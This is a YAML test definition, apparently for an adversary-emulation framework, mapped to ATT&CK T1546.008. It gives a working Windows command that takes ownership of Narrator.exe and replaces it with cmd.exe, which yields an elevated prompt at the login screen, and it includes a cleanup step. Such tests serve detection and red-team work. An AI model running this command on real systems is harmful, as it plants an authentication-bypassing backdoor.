- requirements: []
  name: Soumaia ART Tests - Replace Narrator.exe (Narrator binary) with cmd.exe
  description: Replace Narrator.exe (Narrator binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Narrator button from the Accessibility menu on the login screen. (requires elevation)
  tactic: privilege-escalation
  technique_id: T1546.008
  technique_name: 'Event Triggered Execution: Accessibility Features'
  executors:
  - cleanup:
    - copy /Y C:\Windows\System32\Narrator_backup.exe C:\Windows\System32\Narrator.exe
    timeout: 60
    platform: windows
    name: cmd
    payloads: []
    parsers: []
    command: IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd ) & takeown /F C:\Windows\System32\Narrator.exe /A & icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t & copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe
  id: 56617e5e-6217-55a0-9703-1e51ee04fccc
